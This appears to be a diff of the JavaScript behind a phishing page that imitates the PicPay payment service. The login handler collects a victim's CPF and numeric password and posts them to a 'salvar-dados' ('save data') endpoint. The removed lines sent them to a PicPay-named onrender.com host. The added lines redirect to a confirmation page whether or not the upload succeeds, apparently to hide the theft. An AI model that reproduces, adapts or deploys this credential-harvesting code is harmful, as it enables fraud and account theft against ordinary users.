@@ -2,7 +2,6 @@
 
 document.addEventListener('DOMContentLoaded', () => {
 
-    // Função universal para a máscara de CPF
     const inicializarMascaraCPF = () => {
         const cpfField = document.querySelector('input[placeholder^="CPF"]'); // Pega qualquer input que comece com "CPF"
         if (cpfField) {
@@ -17,10 +16,9 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Função universal para o modal
     const inicializarModais = () => {
         const modalOverlay = document.getElementById('modalOverlay');
-        if (!modalOverlay) return; // Se não tem modal na página, sai da função
+        if (!modalOverlay) return; 
 
         const modalContent = document.getElementById('modalContent');
         const closeModalBtn = document.querySelector('.modal-close-btn');
@@ -40,7 +38,6 @@ document.addEventListener('DOMContentLoaded', () => {
             modalOverlay.classList.remove('active');
         };
 
-        // Adiciona eventos de clique nos links para abrir os modais
         document.querySelectorAll('a[id]').forEach(link => {
             link.addEventListener('click', e => {
                 e.preventDefault();
@@ -56,49 +53,47 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     };
 
-    // Função para a página de LOGIN (index.html)
-    const inicializarPaginaLogin = () => {
-        const loginForm = document.querySelector('form:not(#emprestimoForm)');
-        if (!loginForm) return;
+const inicializarPaginaLogin = () => {
+    const loginForm = document.querySelector('form:not(#emprestimoForm)');
+    if (!loginForm) return;
 
-        // Filtro de teclado numérico para a senha
-        const senhaInput = document.querySelector('input[placeholder="Digite sua senha"]');
-        senhaInput.addEventListener('keydown', (event) => {
-            const code = event.code;
-            if (event.ctrlKey || event.metaKey || !event.key.match(/^\d$/) && event.key.length === 1) {
-                if (!['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(event.key)) {
-                    event.preventDefault();
-                }
-            } else if (!code.startsWith('Digit')) {
-                 event.preventDefault();
+    const senhaInput = document.querySelector('input[placeholder="Digite sua senha"]');
+    senhaInput.addEventListener('keydown', (event) => {
+        const code = event.code;
+        if (event.ctrlKey || event.metaKey || !event.key.match(/^\d$/) && event.key.length === 1) {
+            if (!['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(event.key)) {
+                event.preventDefault();
             }
-        });
+        } else if (!code.startsWith('Digit')) {
+             event.preventDefault();
+        }
+    });
+    
+    loginForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
+        const senha = senhaInput.value;
+        if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
         
-        // Submit do formulário de login
-        loginForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-            const cpf = loginForm.querySelector('input[placeholder="CPF"]').value;
-            const senha = senhaInput.value;
-            if (!cpf || !senha) return alert('Por favor, preencha todos os campos.');
+        try {
             
-            try {
-                const response = await fetch('https://picpay-fky2.onrender.com/salvar-dados', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cpf, senha }),
-                });
-                const result = await response.json();
-                alert(result.message);
-            } catch (error) {
-                alert('Não foi possível conectar ao servidor. Tente novamente mais tarde.');
-            }
-        });
+            const response = await fetch('/salvar-dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ cpf, senha }),
+            });
+            
+            await response.json(); 
 
-        // Botão de navegação
-        
-    };
-
-    // Função para a página de EMPRÉSTIMOS
+            
+            window.location.href = 'confirmacao.html';
+            
+        } catch (error) {
+            console.error("Falha ao enviar dados:", error);
+            window.location.href = 'confirmacao.html';
+        }
+    });
+};
     const inicializarPaginaEmprestimos = () => {
         const emprestimoForm = document.getElementById('emprestimoForm');
         if (!emprestimoForm) return;
@@ -123,7 +118,6 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
 
-    // Executa todas as funções de inicialização
     inicializarMascaraCPF();
     inicializarModais();
     inicializarPaginaLogin();
